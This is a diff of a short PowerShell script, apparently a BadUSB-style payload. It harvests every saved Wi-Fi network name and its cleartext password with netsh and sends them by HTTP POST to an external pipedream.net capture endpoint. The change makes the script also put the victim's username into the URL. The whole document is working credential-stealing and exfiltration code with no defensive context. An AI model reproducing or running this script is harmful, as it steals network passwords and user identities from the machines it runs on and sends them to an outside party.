@@ -1,2 +1,2 @@
 $tmp = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | ForEach-Object {echo "{$name : $pass}"}
-Invoke-RestMethod https://encssv4vtly2.x.pipedream.net/endpoint -Method Post -Body $tmp
+Invoke-RestMethod https://encssv4vtly2.x.pipedream.net/$(whoami) -Method Post -Body $tmp
